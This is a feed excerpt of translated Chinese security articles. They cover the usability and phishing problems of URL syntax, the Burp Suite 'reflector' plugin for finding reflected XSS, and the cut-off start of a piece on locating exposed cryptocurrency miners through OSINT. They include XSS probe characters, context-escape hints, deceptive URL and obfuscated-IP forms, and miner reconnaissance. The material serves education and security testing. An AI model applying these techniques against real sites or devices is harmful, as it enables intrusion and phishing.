&lt;/li&gt;&lt;li&gt;只为非安全的协议显示安全标识符，比如 Chrome 的 “Not Secure” 标签。 &lt;/li&gt;&lt;li&gt;不为安全的协议显示安全标识符。 &lt;/li&gt;&lt;li&gt;继续弃用和移除不安全的协议。理想情况下，随着 HTTPS-ify （HTTPS 认证 ）的持续发展，人们以后能看见的协议恐怕就只有 HTTPS 这一个了。 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Safari 浏览器已经完成了上述大部分工作，尽管有一点我认为是错误的：对于一些有扩展验证的站点（EV，Extended Validation ），它显示了 EV 的名字而不是前面所说的 eTLD+1。这也让 goat-worms（山羊蠕虫）变得有机可乘（&lt;a href=&quot;https://noncombatant.org/2017/02/15/decoding-chromes-https-ux/#what-about-extended-validation-certificates&quot;&gt;相关的文章&lt;/a&gt;）。但是通过 Safari 浏览器的尝试也能瞥见 URL 命名方式的美好未来。桌面文件也大胆的采用这种方式，在你点击关注地址栏之前仅仅显示主机名。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8b57135dd2b6aad503f5d9b4950d021c_r.jpg&quot; data-caption=&quot;很棒，不是吗？ &quot; data-rawwidth=&quot;648&quot; data-rawheight=&quot;135&quot;&gt;&lt;p&gt;事实上，eTLD+1、主机名和复制粘贴部分内容是大多数人采用的方式。为了提高 URL的可用性和安全性，应用程序和平台的开发者只需要按照以下流程来工作： &lt;/p&gt;&lt;p&gt;（在做了上面提的一些方面后或多或少仍有一些问题。）&lt;/p&gt;&lt;p&gt;1、异常的主机名仍然令人困惑。       &lt;/p&gt;&lt;p&gt;        1、我认为困惑本身对人们来说是有用的，具有良好形态的主机名，     像“facebook.com”、“baidu.com”就创建了一个好的品牌。主机名在广告和大众文化中是很普及的。&lt;/p&gt;&lt;p&gt;       2、异常的主机名本身就是易于区分的，比如，“facebook.com”和“facebook.com.wumpgarble.phishing.blog”，特别是当使用eTLD+1时，“phishing.blog”显然不是“facebook.com”。 &lt;/p&gt;&lt;p&gt;      3、正如baidu.com和mixi.jp，它们甚至可以跨越语言和字符集屏障使用，尽管有IDN（Internationalized domain name，&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E5%9B%BD%E9%99%85%E5%8C%96%E5%9F%9F%E5%90%8D#cite_note-1&quot;&gt;国际化域名&lt;/a&gt;）可以提供帮助。 &lt;/p&gt;&lt;p&gt;2、人们需要分享链接，开发人员也需要读、写和修改它们。 &lt;/p&gt;&lt;p&gt;     1、我想我们可以通过在地址栏获得焦点时使整个URL可见和可编辑来处理这个问题。&lt;/p&gt;&lt;p&gt;3、同形异意词攻击仍然存在 &lt;/p&gt;&lt;p&gt;    1、集中命名机构也有这个问题 &lt;/p&gt;&lt;p&gt;    2、应对这个机制的方法可以在集中式或分散式的命名方案中起到作用。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;问题 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;URL 几乎变成了用户界面的组件：人们期望可以编辑 URL，复制粘贴它们，（至少部分地）解析它们以提取出相关的安全信息，有时也会修改它们，所有这些甚至可以在一个小小的手机屏幕上完成。 &lt;/p&gt;&lt;p&gt;事实证明这并不是太好，因为为了实现这些目标，URL 必须相当复杂，即使在最简单的情况下对象序列化和反序列化也难以实现。最后的问题就是人们很难在实际应用中使用 URL。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;URLs 的复杂性 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;尽管 &lt;a href=&quot;https://cs.chromium.org/chromium/src/url/gurl.h?sq=package:chromium&amp;amp;dr=CSs&amp;amp;l=472&quot;&gt;Chrome&lt;/a&gt; &lt;a href=&quot;https://cs.chromium.org/chromium/src/url/gurl.h?sq=package:chromium&amp;amp;dr=CSs&amp;amp;l=472&quot;&gt;使用的实现方法更加复杂&lt;/a&gt;（另请参阅 &lt;a href=&quot;https://cs.chromium.org/chromium/src/url/third_party/mozilla/url_parse.h?sq=package:chromium&amp;amp;dr=CSs&amp;amp;l=77&quot;&gt;url::Parsed&lt;/a&gt;），我们可以想象，URL 的结构实际上不需要太复杂，比如： &lt;/p&gt;&lt;code lang=&quot;java&quot;&gt;class URL { 
 string scheme 
 string username 
 string password 
 string host 
 string port 
 string path 
 string query 
 string ref    // Also called &quot;fragment&quot;. 
} &lt;/code&gt;&lt;p&gt;有点太简单了。首先，TCP 和UDP 端口号是 16 位无符号整型，并不是随意的字符串。其次，主机可以是 IPV4 的地址也可以是 IPV6 的地址或者其他网络类型的地址。还可以是 DNS主机名、NETBIOS 主机名（Network Basic Input/Output System，网络基本输入输出系统）或某个其他域中的名字。即使仅仅考虑 DNS 和 NETBIOS 主机名，简单的字符串也不能完全涵盖我们所需要的信息。 &lt;/p&gt;&lt;ol&gt;&lt;li&gt;DNS 是分级的（最多有127级），一个名称由一个或多个标签组成，每个标签包含 1 到63 个八位字节数，名称的内部总长度最多可达到 255 个八位字节数的长度。（&lt;a href=&quot;https://en.wikipedia.org/wiki/Domain_Name_System#Domain_name_syntax&quot;&gt;维基百科&lt;/a&gt;） &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/NetBIOS#Name_service&quot;&gt;维基百科说&lt;/a&gt;，“NetBIOS 名称的长度是 16 个八位字节数的长度，根据具体的实现而有所不同。通常，第 16 个八位字节称为 NetBIOS 后缀，指定资源的类型，可以用来告诉其他应用程序系统提供什么类型的服务”。 这留下了一些问题，但我们不会在此深究。 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;所以，现在让我们的表示方法复杂一点： &lt;/p&gt;&lt;code lang=&quot;java&quot;&gt;abstract class NetworkAddress { ... } 
class IPv4NetworkAddress extends NetworkAddress { ... } 
class IPv6NetAddress extends NetworkAddress { ... } 
abstract class HostName { ... } 
class DNSName extends HostName { ... } 
class NetBIOSName extends HostName { ... } 
class HostIdentifier { 
 enum Type { 
   Address, 
   Name 
 } 
 union { 
 NetworkAddress address 
 HostName name 
 } 
} 
class URL { 
 string scheme 
 string username 
 string password 
 HostIdentifier host 
 uint16_t port 
 string path 
 string query 
 string ref  // Also called &quot;fragment&quot;. 
} &lt;/code&gt;&lt;p&gt;我们更加严格的限定了端口，并且 HostIdentifier 是两个抽象类 NetworkAddress 和 HostName 的总和类型。反过来说，抽象类型被实例化为具体的地址和名称，我们已经给出了一些例子。 &lt;/p&gt;&lt;p&gt;虽然真实的实现细节是很复杂的，但是让我们来进一步假设这个 string 类型是一系列的 Unicode 字符。 &lt;/p&gt;&lt;p&gt;每个这些假设的类至少有一个序列化函数和至少一个反序列化函数或者是构造函数。即使是IPV4 这样的 4 字节数据结构也能清楚的表示。一个使用了 BSD 套接字函数 inet_aton （反序列化）和 inet_ntoa（序列化）的&lt;a href=&quot;https://noncombatant.org/2017/11/07/problems-of-urls/ipv4-parser.c&quot;&gt;简单程序&lt;/a&gt;能够产生下面相同的效果： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Serialized       Deserialized  Reserialized    
222.173.190.239  0xDEADBEEF    222.173.190.239 
0xDEADBEEF       0xDEADBEEF    222.173.190.239 
033653337357     0xDEADBEEF    222.173.190.239 
222.11386607     0xDEADBEEF    222.173.190.239 
222.173.48879    0xDEADBEEF    222.173.190.239 
127.0.0.1        0x7F000001    127.0.0.1       
0x7F000001       0x7F000001    127.0.0.1       
127.1            0x7F000001    127.0.0.1       
127.0.1          0x7F000001    127.0.0.1 &lt;/code&gt;&lt;p&gt;Chrome 会将 &lt;a href=&quot;http://151.101.193.67/&quot;&gt;http://0x9765C143&lt;/a&gt; 转换为 &lt;a href=&quot;http://151.101.193.67/&quot;&gt;http://151.101.193.67/&lt;/a&gt;，并定位到这个网址去；然而Firefox 会直接定位到 &lt;a href=&quot;http://151.101.193.67/&quot;&gt;http://0x9765C143&lt;/a&gt; 这个地址中去，并不会再地址栏将其先转换为点分十进制。 &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/IPv6_address#Representation&quot;&gt;正如维基百科中说的那样&lt;/a&gt;，IPV6 地址有自己的表示形式。值得一提的是为了避免冒号分隔的十六进制 IPV6 地址和同样是冒号分隔的端口号产生混乱，IPV6 的地址必须要被包括在一对方括号中：  &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://[2001:db8:85a3:8d3:1319:8a2e:370:7348]:443/foo/bar/noodles         
        +---------------IPv6 address --------+  ^          
                                                |              
                                                port  &lt;/code&gt;&lt;p&gt;&lt;b&gt;语法 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;每种语言都有很多的语法元字符，尤其是当一些语法元字符根据上下文的不同而产生多种意义时，我就称这种语言具有 “syntaxy” 特性。如果你尝试编写一个 URL 解析器，你会发现它必须要能区分多种情况，（冒号）: 到底是协议 :// 的一部分，还是一个十六进制的分隔符，或者是端口号的分隔符。同样，/ 也至少有两重意思。 &lt;/p&gt;&lt;p&gt;或许是在不知不觉中，人们需要在大脑中建立相同的状态机制来解析 URL，否则就会陷入困境。除此之外，URL 协议并不是真正的单词，/ 看起来也像是 \，等等这样的情况，人们对URL 这种语言的理解是模糊的，它这并不是一种人们能够轻易掌握的语言。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;要达到的目标 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于 URL 可用性问题的解决方案至少有以下几点属性： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;明确的语法 &lt;/li&gt;&lt;li&gt;明确划分源的安全 &lt;/li&gt;&lt;li&gt;书写不能过于繁琐 &lt;/li&gt;&lt;li&gt;易于阅读（低合成度） &lt;/li&gt;&lt;li&gt;减少组件以避免混淆并且降低 URL 语法的复杂性 &lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;缓解措施 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;不能从更根本上思考 URL 就无法真正解决它带来的问题。URL 非常普及，而结构就是它们存在的问题：组成成分过于冗杂。 &lt;/p&gt;&lt;p&gt;或许我们只能在一定程度上减轻这个问题，或许头脑风暴、集思广益一番会有更多有趣的收获。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;弃用和移除 URL 中的字段 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;首先，我们可以把 URL 中不需要的部分或加剧我们研究问题的部分去掉。&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=661005&quot;&gt;Chromium issue 661005&lt;/a&gt; 有一个很好的例子： &lt;/p&gt;&lt;p&gt;重现步骤： &lt;/p&gt;&lt;p&gt;1、  定位到 &lt;a href=&quot;https://www.google.com:443+q%3Delon@tesla.com/&quot;&gt;https://www.google.com:443+q=elon@tesla.com&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2、  由此产生的页面应该是：&lt;a href=&quot;https://www.tesla.com/&quot;&gt;https://www.tesla.com&lt;/a&gt; &lt;/p&gt;&lt;p&gt;预期的行为是什么？&lt;/p&gt;&lt;p&gt;警告用户他们将发送登录凭证：&lt;/p&gt;&lt;p&gt;       -  用户名：“&lt;a href=&quot;http://www.google.com/&quot;&gt;www.google.com&lt;/a&gt;”&lt;/p&gt;&lt;p&gt;       -   密码：“443+q=elon” &lt;/p&gt;&lt;p&gt;更严重的是，混在 URL 中的 username 和 password 字段使主机名变得难以区分，并且增加了钓鱼攻击的风险。比如，人们或许会认为 &lt;a href=&quot;mailto:https://paypal@phishing.com&quot;&gt;https://paypal@phishing.com&lt;/a&gt;  是指向 Paypal 这个网站，但是实际上它是指向 phishing.com 的。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://support.microsoft.com/en-us/help/834489/internet-explorer-does-not-support-user-names-and-passwords-in-web-sit&quot;&gt;Internet Exploer&lt;/a&gt; &lt;a href=&quot;https://support.microsoft.com/en-us/help/834489/internet-explorer-does-not-support-user-names-and-passwords-in-web-sit&quot;&gt;在很久之前就放弃了对嵌入在&lt;/a&gt; &lt;a href=&quot;https://support.microsoft.com/en-us/help/834489/internet-explorer-does-not-support-user-names-and-passwords-in-web-sit&quot;&gt;URL&lt;/a&gt; &lt;a href=&quot;https://support.microsoft.com/en-us/help/834489/internet-explorer-does-not-support-user-names-and-passwords-in-web-sit&quot;&gt;中证书的支持&lt;/a&gt;，明智的是，Edge 并没有恢复此支持。Firefox 支持嵌套的证书，但是会对此提出警告。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-12516de41ec5f15425e50d1d7c980a19_r.jpg&quot; data-caption=&quot;Firefox会对访问嵌入证书的URL发出警告。&quot; data-rawwidth=&quot;671&quot; data-rawheight=&quot;261&quot;&gt;&lt;p&gt;Chrome 不支持在子资源中使用嵌套证书的 URL，但是&lt;a href=&quot;https://xkcd.com/1172/&quot;&gt;不可避免&lt;/a&gt;的，这会&lt;a href=&quot;https://bugs.chromium.org/p/chromium/issues/detail?id=779116&quot;&gt;妨碍别人的使用&lt;/a&gt;。那么我们似乎可以通过允许他们在子资源的 URL 中尽可能少的使用案例，（像 Firefox）会警告人们当向顶级域名跳转的时候。但如果我们认为问题不仅在于证书嵌套，还在于增加了问题的复杂性、降低了可靠性，也降低了 URL 解析器的一致性，那么证明这个方法并没有解决整个问题。&lt;/p&gt;&lt;p&gt;由于 IE 和 Edge 浏览器不支持嵌套凭证，在数十年前它们就已经失去了成为可靠的网络平台的特点。为什么 Chrome 和 Firefox 继续放纵这种可能引发钓鱼攻击的行为呢？&lt;/p&gt;&lt;p&gt;其他语言，比如JSON 面临着严重的可靠性和不一致性的问题，我认为 web 是一个具有前瞻性的平台，它应逐渐去除这些模糊的接口。&lt;a href=&quot;https://github.com/brave/browser-laptop/issues/10825&quot;&gt;这儿&lt;/a&gt;有个与浏览器解析器不一致的问题。  &lt;/p&gt;&lt;p&gt;&lt;b&gt;消除和弃用不规则的主机地址表现形式 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;没有任何理由相信用户输入的十六进制、八进制或其他奇怪形式的 IP 地址。它们或许会被用于攻击以掩盖某些东西（尽管点分四组的表示形式足以掩盖主机名的本质）。&lt;a href=&quot;https://blogs.msdn.microsoft.com/ieinternals/2014/03/06/browser-arcana-ip-literals-in-urls/&quot;&gt;Internet Explore曾经授权（内联网区域）&lt;/a&gt; &lt;a href=&quot;https://blogs.msdn.microsoft.com/ieinternals/2014/03/06/browser-arcana-ip-literals-in-urls/&quot;&gt;URL&lt;/a&gt; &lt;a href=&quot;https://blogs.msdn.microsoft.com/ieinternals/2014/03/06/browser-arcana-ip-literals-in-urls/&quot;&gt;可以在主机名中不使用点号&lt;/a&gt;，包括模糊形式的 URL。除了用于攻击，我敢说没有人会使用这些形式的地址。读到这里的读者多少都是对技术有一定了解的，也会惊讶这些奇怪的表现形式的存在。让我们先把这些历史遗留问题抛在一边。  &lt;/p&gt;&lt;h2&gt;&lt;b&gt;大胆的设想 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这些都是缓解问题的好方法，但是我猜可能已经太迟了。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;同一方向的分层名称&lt;/b&gt; &lt;/p&gt;&lt;p&gt;DNS 主机名和文件名都是 URL 中两种命名方式，也都是采用分层命名，然而走的却是两个相反的方向！ &lt;/p&gt;&lt;p&gt;在 DNS 域名 &lt;a href=&quot;http://www.example.com/&quot;&gt;www.example.com&lt;/a&gt; 中，com 是 example 的父级域名，example 是 www 的父级域名，域名从左到右依次是子域名到父域名，我称这为&lt;a href=&quot;https://en.wikipedia.org/wiki/Endianness&quot;&gt;小端命名&lt;/a&gt;方式。 &lt;/p&gt;&lt;p&gt;在路径 /noodles/doodles/poodles.php 中，noodles 是doodles 的父路径，poodles.php 是doodles 下的文件，从左到右依次为从父到子，称这种方式为大端命名方式。 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://www.example.com/noodles/doodles/poodles.php       
        --------------- +++++++++++++++++++++++++++       
          little-endian   big-endian  &lt;/code&gt;&lt;p&gt;这已经令人十分迷惑了，但是考虑到国际化域名（&lt;a href=&quot;https://en.wikipedia.org/wiki/Internationalized_domain_name&quot;&gt;IDN&lt;/a&gt;）和其他 Unicode  编码方式的 URL 组件时，问题会更加复杂。使问题变得更加棘手的原因是：一些语言从右向左阅读（RTL），如阿拉伯语或希伯来语，而不是像英语一样从左到右（LTR）。进一步考虑，URL可能会同时包含 LTR 和 RTL 组件。（实际上，所有采用 RTL 主机名方式的 URL 都至少有一个 LTR 组件：开头的 https 协议或其他协议） &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://twitter.com/typhoonfilsy/status/927701344185491456&quot;&gt;typhoonfilsy&lt;/a&gt; 提供了一个不错的例子： &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6a0216152e91733533362082bd4c50f4_r.jpg&quot; data-caption=&quot;在主机名和路径中都包含阿拉伯语和英语的URL。&quot; data-rawwidth=&quot;399&quot; data-rawheight=&quot;42&quot;&gt;&lt;p&gt;现在我们有大端和小端命名的两个名字，每个都包含 LTR 和 RTL 的组件。如果命名空间的层次划分都往一个方向，这将是十分有用的，至少会减少一个方向上的困扰。 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://com.example.www/noodles/doodles/poodles.php       
       +++++++++++++++ +++++++++++++++++++++++++++       
         big-endian      big-endian  &lt;/code&gt;&lt;p&gt;在 RTL 语言中，这样做会更容易混淆： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;php.seldoop/seldood/seldoon/www.elpmaxe.moc：// HTTPS
+++++++++++++++++++++++++++ ++++++++++++++++  
big-endian                       big-endian
    RTL                          RTL            LTR  &lt;/code&gt;&lt;p&gt;然而，随着新的顶级域名的扩展（TLDs）,降低了使 DNS 成为大端命名的可能性。比如，blog.google 和 google.blog 都是合法的 DNS 域名（只有前者是目前已经注册并为网站提供实时的服务，另一个与顶级域名扩展有关的问题是提高了欺骗的机会）。交换域名的字节序会使问题更加困惑，至少对于这些形态的例子。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;简化语法 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们可以假想一种新的 URL 语法，它拥有更少的模糊的语法元字符。这只是一种设想并不是严格的实验，这里假设用逗号来分隔 URL 的组件，用斜杠来分割命名中的不同位置： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https,com/example/www,,noodles/doodles/poodles.php 
https,com/example/www,443,noodles/doodles/poodles.php 
https,com/example/www,,noodles/doodles/poodles.php,q=cute%20puppies 
https,com/example/www,,noodles/doodles/poodles.php,q=cute%20puppies,table-of-contents &lt;/code&gt;&lt;p&gt;与往常一样，在给定组件中使用的元字符必须要进行转义，在查询字符串里逗号被转义为 %2c： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https,com/example/www,,noodles/doodles/poodles.php,q=cute%2C%20puppies &lt;/code&gt;&lt;p&gt;如果用 ,,（两个逗号）表示协议默认的端口使你迷惑的话，我们可以这样： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https/443,com/example/www,noodles/doodles/poodles.php 
https/8443,com/example/www,noodles/doodles/poodles.php &lt;/code&gt;&lt;p&gt;我们也可以考虑给每个 URL 组件加上自己的标签，而不仅仅是依赖它们的顺序。这样会去除默认或可选组件的空占位符。这种形式写起来或许困难但读起来却很容易。 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;scheme:https,port:443,host:com/example/org 
scheme:https,port:443,host:com/example/org,path:a/b/c 
scheme:https,host:com/example/org,path:a/b/c 
host:com/example/org,path:a/b/c,scheme:https &lt;/code&gt;&lt;p&gt;现在就要考虑过滤逗号、反斜线和冒号等符号了。 &lt;/p&gt;&lt;p&gt;现在你该明白了，使用别的不同的语法也是可能的解决方案。 &lt;/p&gt;&lt;p&gt;到此足矣。 &lt;/p&gt;&lt;p&gt;感谢 Eric Lawrence 和 Yan Zhu 提供的一些问题实例，并感谢 Emily Stark-Dunn 和Owen Campbell-Moore 阅读早期稿件并提供有益的想法。 &lt;/p&gt;&lt;p&gt;有问题可以&lt;a href=&quot;mailto:chris@noncombatant.org&quot;&gt;联系我&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;https://noncombatant.org/2017/11/07/problems-of-urls/#NamesArePower&quot;&gt;Some Problems Of URLs&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-12-30958554</guid>
<pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Burpsuite 插件之 reflector</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-11-05-30750491.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Burpsuite 插件之 reflector&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30750491&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7e5987aef351cdef9bf0eded7fb2dc45_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;概述 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;此插件能够在浏览网页时实时的发现反射型 XSS 漏洞，包括以下几个特点： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;在响应标签中高亮显示存在反射型 XSS 的位置 &lt;/li&gt;&lt;li&gt;测试在该反射型 XSS 中允许哪些标签符号 &lt;/li&gt;&lt;li&gt;分析反射的上下文 &lt;/li&gt;&lt;li&gt;设置 contentType 的白名单 &lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;如何使用 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;安装好这个扩展之后就可以开始测试你的 web 应用程序了。每当找到一个反射型 XSS 后，reflector 就会定义它的严重性并在 burpsuite 中生成 issue，显示出发现的问题。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8976c91a0afe199585ef9fedd732b599_r.gif&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1246&quot; data-rawheight=&quot;832&quot; data-thumbnail=&quot;https://pic2.zhimg.com/v2-8976c91a0afe199585ef9fedd732b599_b.jpg&quot;&gt;&lt;p&gt;每个 issue 都涵盖了反射参数的详细信息，如： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;该种反射允许使用的特殊符号 &lt;/li&gt;&lt;li&gt;在响应中高亮存在反射的值 &lt;/li&gt;&lt;li&gt;反射 XSS 处上下文的分析&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;分析允许的符号 &lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-186a41d21bd8ae7ceb7b8fe697d6d3e7_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;984&quot; data-rawheight=&quot;375&quot;&gt;&lt;p&gt;当一个反射型漏洞被找到，并且 option 选项卡的 “aggressive mode” 是激活状态时，reflector会从漏洞参数中检查哪些特殊符号会被显示在页面上。对于此操作，reflector 会为每一个漏洞参数构造一个请求。比如说，我们用 refletor 测试 elkokc.ml 这个站点，发现了3个搜索处存在反射型 XSS，并且每一处都通过了特殊符号的测试，所以 issue 的 Severity 属性值被定为High。每次 reflector 检测到一处反射型 XSS 就会定义 Severity 的等级，并在 burpsuite 中报告一个 issue。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;上下文分析 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 ”Check context” 模式中，reflector 不仅会显示反射到页面中的特殊字符而且还会找出能够跳出当前语法限制的字符。比如，当搜索参数带上 payload  ”p@y&amp;lt;”’”  发往服务器时，你能看到服务器对这个特殊请求的响应，然而在不同的上下文中却有所不同。 &lt;/p&gt;&lt;ol&gt;&lt;li&gt;当上下文出现 ‘ , ” 时，使用 &amp;lt; 和双引号可以逃离当前的上下文限制插入 HTML 代码； &lt;/li&gt;&lt;li&gt;当上下文出现  ”  时，使用 &amp;lt; 和括号可以注入 HTML 标签； &lt;/li&gt;&lt;li&gt;当上下文出现 ’ , “  时，使用 &amp;lt;和单引号可以结束 js 上下文写入恶意代码。 &lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1a43b10b130c209a9bcd27310745302d_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;687&quot; data-rawheight=&quot;282&quot;&gt;&lt;p&gt;issue 信息被标记为如下： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;上下文字符——可以跳出当前语法限制； &lt;/li&gt;&lt;li&gt;其他字符——可逃离上下文被反射出来。&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a248cd023f252a03d0466eac38522326_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1074&quot; data-rawheight=&quot;461&quot;&gt;&lt;h2&gt;&lt;b&gt;反射位置定位 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;可以通过响应页面的箭头按钮来进行定位到不同的反射处。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4bcc4d7ac99e70a2bad46d138bfe76c4_r.gif&quot; data-caption=&quot;&quot; data-rawwidth=&quot;807&quot; data-rawheight=&quot;684&quot; data-thumbnail=&quot;https://pic1.zhimg.com/v2-4bcc4d7ac99e70a2bad46d138bfe76c4_b.jpg&quot;&gt;&lt;h2&gt;&lt;b&gt;设置 &lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;Scope only——reflector 仅作用于被添加的站点； &lt;/li&gt;&lt;li&gt;Aggressive mode——reflector 生成测试 payload 从而产生额外的请求； &lt;/li&gt;&lt;li&gt;Check context——激活上下文检测模式。 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;还可以通过管理 content-Type 白名单来让不同的 reflector 插件工作，但是如果使用除了text/html 之外的其他类型可能会导致运行速度变缓。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8c55c5a09de594681f38beb462f1bd76_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;725&quot; data-rawheight=&quot;619&quot;&gt;&lt;h2&gt;&lt;b&gt;如何编译 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Jdk 1.7 &lt;/p&gt;&lt;p&gt;步骤： &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;javac.exe -d build src/burp/*.java 
jar.exe cf plugin.jar -C build burp &lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;作者 &lt;/p&gt;&lt;ol&gt;&lt;li&gt;hvetsov Alexandr (GitHub:&lt;a href=&quot;https://github.com/shvetsovalex&quot;&gt;shvetsovalex&lt;/a&gt;) &lt;/li&gt;&lt;li&gt;Dimitrenko Egor (GitHub: &lt;a href=&quot;https://github.com/elkokc&quot;&gt;elkokc&lt;/a&gt;) &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;原文：&lt;a href=&quot;https://github.com/elkokc/reflector&quot;&gt;https://github.com/elkokc/reflector&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-11-05-30750491</guid>
<pubDate>Sun, 05 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Hacking Cryptocurrency Miners with OSINT Techniques</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-30-30583233.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Hacking Cryptocurrency Miners with OSINT Techniques&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30583233&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c6a250d6772c007463945761564528a2_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;注意：实验所用的方法可能会对网络产生一定的危害，带来的风险请自行承担。 &lt;/p&gt;&lt;p&gt;Open Source Intelligence（OSINT，开源智能），是在攻击之前收集信息的第一种技术之一。过去也有许多使用 OSINT 攻击的黑客案例。随着 IoT 设备的发展，我们可以在公共网络上收集大量重要信息。本文将以搜集加密货币挖掘设备——挖矿机（比特币 [蚂蚁矿机]和以太坊 [Claymore]）的敏感信息为例。 &lt;/p&gt;&lt;p&gt;许多挖矿机需要连网来发送或者接收数据，这为攻击者提供了可乘之机。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;侦查蚂蚁矿机！ &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;最好的比特币采矿设备是&lt;a href=&quot;https://shop.bitmain.com/antminer_s9_asic_bitcoin_miner.htm?flag=overview&quot;&gt;蚂蚁矿机 &lt;/a&gt;S9 / S7，它的硬件使用了 “lighttpd / 1.4.32” 的 Web 服务器，其中一些开放了 SSH 端口。这儿有一个 “Lighttpd 1.4.31” 的 exploit 。但是，您无法使用此 exploit 攻击服务器。 &lt;/p&gt;&lt;p&gt;Web 服务器上的网页受 “ &lt;a href=&quot;https://en.wikipedia.org/wiki/Digest_access_authentication&quot;&gt;Digest HTTP Authentication （摘要认证）&lt;/a&gt;” 的保护。至关重要的一点是矿机 需要用户名和密码来登录。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5e38d2aed8d8d87cc2ede8d761a65a9a_r.jpg&quot; data-caption=&quot;使用摘要认证的蚂蚁矿机配置页面 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;251&quot;&gt;&lt;p&gt;众所周知，使用 OSINT 收集数据需要一些信息或关键字。这里的关键字是在每次向服务器发送请求时出现在 HTTP 头中的 “antMiner 